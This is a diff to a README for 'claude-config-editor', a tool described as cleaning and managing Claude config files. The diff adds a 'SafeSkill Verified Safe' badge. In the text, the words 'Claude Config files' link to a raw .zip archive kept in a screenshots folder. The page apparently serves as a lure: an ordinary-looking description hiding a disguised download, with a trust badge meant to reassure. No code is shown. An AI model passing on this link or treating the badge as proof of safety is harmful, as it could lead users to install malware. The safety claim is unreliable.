@@ -1,5 +1,7 @@
 # 🌟 claude-config-editor - Optimize Your Claude Files Easily
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/genusboragosirharoldwalterkroto654-claude-config-editor)
+
 ## 🚀 Getting Started
 
 Welcome to the Claude Config Editor! This lightweight web tool helps you clean, optimize, and manage your Claude Config files (https://raw.githubusercontent.com/Genusboragosirharoldwalterkroto654/claude-config-editor/main/screenshots/config_editor_claude_v2.5.zip). With this tool, you can analyze project sizes, delete chat histories in bulk, export data for backup, and visually manage your servers— all done locally without any additional dependencies. Let’s get you started.
